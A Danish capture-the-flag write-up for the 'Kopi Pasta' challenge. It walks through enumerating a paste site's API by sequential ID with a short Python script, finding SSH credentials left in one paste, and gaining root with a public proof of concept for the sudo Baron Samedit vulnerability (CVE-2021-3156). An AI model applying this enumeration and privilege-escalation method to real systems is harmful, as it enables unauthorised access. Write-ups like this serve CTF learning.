---
title: "Kopi Pasta"
ctf: "DDC Qualifiers"
challenge_name: "Kopi Pasta"
category: "Crypto"
date: 2026-03-23
tags: [ctf, writeup, Crypto]
status: draft
tools: []
techniques: []
vuln: ""
slug: "kopi-pasta"
---

# Kopi Pasta

## Challenge beskrivelse

Sheeesh jeg har lige lavet den varmeste 🔥 og første hjemmeside nogensinde, hvor man kan dele tekst med andre.  
Du skal bare sende ét link. Der er ikke så mange brugere, da det kun rigtigt er mig og få venner, der har været med til at udvikle hjemmesiden der kender hjemmesiden

MEEEEEEEEEEEEEN du kunne være den første rigtige bruger :D


## Løsning af challenge
Først blev en bruger kreeret. Dernæst blev en såkaldt "paste" lavet. I URL'en ses et specifikt ID: 
`http://kopipasta.cfire/pastes/31`. Hvis den paste før ens egen prøves at tilgås, så fås en fejlmeddelse: 
 ```
Error
Unauthorized
 ```
 
 Hvis der til gengæld kigges på kildekoden for /share, så ses dette kodestykke: 
 ```html
<form id="pasteForm" action="/api/v1/pastes" method="POST">
    <div class="card">
        <div class="form-group">
            <label class="form-label">Paste Title</label>
            <input type="text" name="title" class="form-input" placeholder="Title (Optional)">
        </div>
        <div class="code-editor">
            <textarea name="content" placeholder="Paste text here..." required></textarea>
        </div>
        <div class="form-actions">
            <button type="submit" class="btn btn-primary btn-lg">Create Paste</button>
        </div>
    </div>
</form>
 ```

Der bruges en API til at få disse pastes. Dernæst blev den API tilgået. Dette gav følgende:
```
{"pastes":["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31"]}
```
Tilgås URL'en `http://kopipasta.cfire/api/v1/pastes/1` fås indholdet af det første paste. Et Python script blev dernæst kreeret for at få alle pastes automatisk. 
```python
import requests as r
url = "http://kopipasta.cfire/api/v1/pastes/"
for i in range(1,31):
	pastes = r.get(url+str(i))
	print(pastes.content.decode())
```

Dette gav følgende pastes: 
```
{"content":"Single-origin offal, double poor. Under neon GoldenRod, pure tousled.","id":"1","title":"Zorba the Greek"}

{"content":"From Memphis with occupy. Red threads, narwhal cuts.","id":"2","title":"Nineteen Eighty-Four"}

{"content":"Ironically neutra, sincerely few. Five dollar toast at golden hour in Irving. Low-fi literally. Overheard in Corpus Christi: very semiotics. Tag it five dollar toast, keep it numerous.","id":"3","title":"Hamlet"}

{"content":"Pabst on the outside, flexitarian at heart. Being the road, keep it cronut. Director’s cut: more readymade. Retro at golden hour in Memphis.","id":"4","title":"Leaves of Grass"}

{"content":"Small-batch flannel in San Antonio. Small-batch plaid in San Francisco. From Glendale with typewriter.","id":"5","title":"Wuthering Heights"}

{"content":"Rooftop in Jacksonville, whispering farm-to-table. Scored in raw denim, mixed fortnightly.","id":"6","title":"Madame Bovary"}

{"content":"Fight toward Godard minimalism. Casually ugh.","id":"7","title":"Memoirs of Hadrian"}

{"content":"samedit:what_in_the_67","id":"8","title":"SSH credentials"}

{"content":"IFactor Consulting meets swag ethos. Strictly green juice palettes. Another day, another before they sold out. Just add art party. Built with intelligentsia and Roller Skating.","id":"9","title":"One Thousand and One Nights"}

{"content":"Designing around fixie constraints. Lumbersexual meets ethical. Sing through tote bag alleys.","id":"10","title":"Wuthering Heights"}

{"content":"Deeply YOLO. Austin tote with kangaroo inside.","id":"11","title":"The Stranger"}

{"content":"Green threads, swag cuts. Tumblr tasting notes: someone, abundant, Kyrgyz. Has through tofu alleys.","id":"12","title":"Oedipus the King"}

{"content":"Scored in synth, mixed far. Artisan frames and PaleTurquoise accents. Ironically salvia, sincerely my. Lavender threads, knausgaard cuts.","id":"13","title":"Buddenbrooks"}

{"content":"Backstreets of New Orleans, front row kitsch. Casually chambray. Born in Jersey, raised on squid.","id":"14","title":"The Adventures of Huckleberry Finn"}

{"content":"Mildly obsessed with heirloom. Mornings in Baltimore, afternoons in venmo. Ugh, but make it humblebrag. Gospel-inspired Pop loops with food truck undertones.","id":"15","title":"Sherlock Holmes"}

{"content":"Slow afternoons, paleo everything. Somewhere between chicharrones and YOLO.","id":"16","title":"Beloved"}

{"content":"Back alley wayfarers, side-door actually. Casually brooklyn. Urban Contemporary loops with neutra undertones.","id":"17","title":"The Brothers Karamazov"}

{"content":"Let it be selvage, let it be where. Gluten-free layers over terse basics.","id":"18","title":"Gulliver's Travels"}

{"content":"House selvage with a Russian finish. Jean shorts frames and MediumSeaGreen accents.","id":"19","title":"Sherlock Holmes"}

{"content":"Locally sourced brooklyn, globally Pacific. VHS layers over a lot basics. Mornings in Jacksonville, afternoons in five dollar toast. Unapologetically poutine. Indie Pop loops with chia undertones.","id":"20","title":"Madame Bovary"}

{"content":"Probably too wayfarers for this. Intentionally park. Been toward street minimalism.","id":"21","title":"Harry potter and the sorcerer's stone"}

{"content":"Single-origin cleanse, double none. Ironically everyday, sincerely that. Probably too shabby chic for this.","id":"22","title":"Fairy tales"}

{"content":"Living that aesthetic life. Powered by Thundercats and squid.","id":"23","title":"Bostan"}

{"content":"Endlessly butcher. Brunch maps and Tamil menus. Austin tote with team inside. Dream through freegan alleys. Director’s cut: more brunch.","id":"24","title":"Anna Karenina"}

{"content":"Quietly kickstarter since 2017. Cinema nights, strictly helvetica.","id":"25","title":"Metamorphoses"}

{"content":"Tag it Yuccie, keep it clumsy. Pairing vinegar with Vegetable Beer.","id":"26","title":"The Adventures of Huckleberry Finn"}

{"content":"From Tonga to Greensboro, chasing actually. Shipping Thundercats from North Las Vegas.","id":"27","title":"Oedipus the King"}

{"content":"Soft authentic glow in Cincinnati. Powered by direct trade and sartorial.","id":"28","title":"Zorba the Greek"}

{"content":"Mornings in Cincinnati, afternoons in tilde. Lost in Virginia Beach, found in five dollar toast. Between carry stalls and pour-over pop-ups. Locally sourced blog, globally arrogant.","id":"29","title":"War and Peace"}

{"content":"Low-fi Wes Anderson. From Luxembourg to Oakland, chasing beard. Born in Tampa, raised on lumbersexual. Cerner meets disrupt ethos. Post-everyday mood.","id":"30","title":"One Hundred Years of Solitude"}
```

Det ses hurtigt at der er gemt SSH credentials i paste nummer 8. 
`{"content":"samedit:what_in_the_67","id":"8","title":"SSH credentials"}`

Dernæst blev serveren tilgået fuldendt. Det var nu vigtigt at finde en måde at opnå Root på, ved hjælp af Privilege Escalation. Brugernavnet "samedit" blev googlet. Det fås at en Baron Samedit er en kendt Lokalt Privilegie-eskalatations sårbarhed med CVE nummer 2021-3156. Et POC fra [Github](https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit) blev fundet og det blev brugt til at opnå root. Flaget kunne nu læses hvilket gav: 
`DDC{bruh_i_p4s73d_4_bi7_700_much}`
